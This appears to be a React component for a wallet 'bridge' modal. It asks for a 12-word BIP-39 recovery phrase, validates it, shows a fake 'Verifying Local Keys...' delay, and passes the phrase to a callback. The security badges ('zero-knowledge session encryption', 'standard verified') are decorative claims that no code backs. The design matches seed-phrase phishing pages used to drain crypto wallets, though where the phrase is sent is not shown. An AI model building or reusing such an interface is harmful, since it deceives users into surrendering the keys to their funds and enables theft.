
import React, { useState, useEffect, useRef } from 'react';
import { ThemeVariant } from '../types';
import { validator } from '../services/KeyphraseWordValidator.ts';

interface PilotBridgeSecurityProps {
  theme: ThemeVariant;
  onSuccess: (phrase: string) => void;
  onClose: () => void;
}

const PilotBridgeSecurity: React.FC<PilotBridgeSecurityProps> = ({ theme, onSuccess, onClose }) => {
  const [userInput, setUserInput] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [isValid, setIsValid] = useState(false);
  const [wordCount, setWordCount] = useState(0);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const textareaRef = useRef<HTMLTextAreaElement>(null);

  useEffect(() => {
    const runValidation = async () => {
      const text = userInput.trim();
      const words = text ? text.split(/\s+/) : [];
      const count = words.length;
      setWordCount(count);

      // Perform validation on every keystroke
      const result = await validator.validatePhrase(userInput);
      setIsValid(result.valid);
      setErrorMessage(result.error || null);
    };

    runValidation();
  }, [userInput]);

  const handleInputChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    let value = e.target.value;
    const lastChar = value[value.length - 1];

    // Auto-formatting logic:
    // When a space is typed, we check the word count and replace with a newline if it's every 4th word.
    if (lastChar === ' ') {
      const words = value.trim().split(/\s+/);
      if (words.length > 0 && words.length % 4 === 0 && !value.endsWith('\n')) {
        value = value.trim() + '\n';
      }
    }

    setUserInput(value);
  };

  const handleAuthorize = () => {
    if (!isValid) return;
    setIsVerifying(true);
    setTimeout(() => {
      onSuccess(userInput);
    }, 1500);
  };

  return (
    <div className="fixed inset-0 z-[1000] flex items-center justify-center px-4">
      <div className="absolute inset-0 bg-black/60 backdrop-blur-md" onClick={onClose} />
      
      {/* REFINED GLASSMORPHISM UI: Increased transparency (bg-white/40) and kept strong blur for the frosted effect */}
      <div className="relative w-full max-w-[440px] bg-white/40 backdrop-blur-xl border border-white/50 rounded-[48px] p-10 flex flex-col items-center animate-[scaleUp_0.3s_ease-out] shadow-[0_32px_64px_-12px_rgba(0,0,0,0.4)]">
        <div className="w-full flex justify-between items-start mb-6">
          <div className="flex items-center gap-4">
            <div className={`w-16 h-16 rounded-2xl flex items-center justify-center shadow-lg transition-colors ${isValid ? 'bg-emerald-500' : 'bg-[#2563EB]'}`}>
              <svg className="w-8 h-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <div>
              <p className="text-[10px] font-black text-[#0A2540] uppercase tracking-[0.1em] mt-1">
                SECURITY PROTOCOL:<br />BIP-39 LINGUISTIC AUDIT
              </p>
            </div>
          </div>
          <button onClick={onClose} className="p-2 text-[#0A2540]/40 hover:text-[#0A2540] transition-colors">
            <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M6 18L18 6M6 6l12 12" /></svg>
          </button>
        </div>

        <div className="w-full mb-2">
          <span className="text-[9px] font-black text-[#0A2540]/60 uppercase tracking-[0.2em]">Enter 12-word recovery phrase</span>
        </div>

        <div className="w-full relative mb-6">
          {/* Inner Glass Textarea */}
          <textarea
            ref={textareaRef}
            autoFocus
            className={`w-full h-48 p-8 rounded-[40px] border bg-white/20 backdrop-blur-sm text-[#0A2540] font-bold text-lg leading-relaxed outline-none transition-all resize-none placeholder:text-[#0A2540]/40 placeholder:text-[14px] ${
              errorMessage ? 'border-rose-500/50 ring-4 ring-rose-500/10' : 'border-white/30 focus:border-[#2563EB]/50 focus:ring-4 focus:ring-[#2563EB]/10'
            }`}
            placeholder="Words separated by single space"
            value={userInput}
            onChange={handleInputChange}
          />
        </div>

        {/* Inner Glass Stats Bar */}
        <div className={`w-full py-3 rounded-full flex flex-col items-center justify-center gap-1 mb-6 transition-all border ${isValid ? 'bg-emerald-500/10 border-emerald-500/20' : 'bg-black/5 border-black/10'}`}>
          <span className={`text-[10px] font-black uppercase tracking-widest ${isValid ? 'text-emerald-700' : 'text-[#0A2540]/60'}`}>
            Words: {wordCount} / 12
          </span>
          {errorMessage && (
            <span className="text-[8px] font-black uppercase text-rose-600 tracking-tighter">
              {errorMessage}
            </span>
          )}
        </div>

        <button
          onClick={handleAuthorize}
          disabled={!isValid || isVerifying}
          className={`w-full py-5 rounded-[28px] text-sm font-black italic uppercase tracking-widest transition-all duration-300 ${
            isValid 
              ? 'bg-[#2563EB] text-white shadow-[0_12px_24px_rgba(37,99,235,0.4)] active:scale-95' 
              : 'bg-black/10 text-[#0A2540]/40 cursor-not-allowed'
          }`}
        >
          {isVerifying ? 'Verifying Local Keys...' : 'Authorize Bridge Connection'}
        </button>

        {/* Inner Glass Footer Bar */}
        <div className="w-full mt-8 p-4 rounded-3xl bg-white/20 border border-white/30 flex items-center gap-4">
           <div className={`w-10 h-10 rounded-xl flex items-center justify-center shrink-0 transition-colors ${isValid ? 'bg-emerald-500' : 'bg-[#3B82F6]'}`}>
             <svg className="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M2.166 4.9L10 .155 17.834 4.9a2 2 0 011.166 1.81V11c0 4.14-2.8 8.01-6.733 9.477l-.267.1a2 2 0 01-1.467 0l-.267-.1C6.3 19.01 3.5 15.14 3.5 11V6.71a2 2 0 011.166-1.81z" clipRule="evenodd" /></svg>
           </div>
           <p className="text-[8px] font-black text-[#0A2540]/70 uppercase leading-tight tracking-wider">
             PROTOCOL: BIP-39 STANDARD VERIFIED.<br />
             ZERO-KNOWLEDGE SESSION ENCRYPTION.
           </p>
        </div>
      </div>
      
      <style>{`
        @keyframes scaleUp {
          from { transform: scale(0.95); opacity: 0; }
          to { transform: scale(1); opacity: 1; }
        }
      `}</style>
    </div>
  );
};

export default PilotBridgeSecurity;
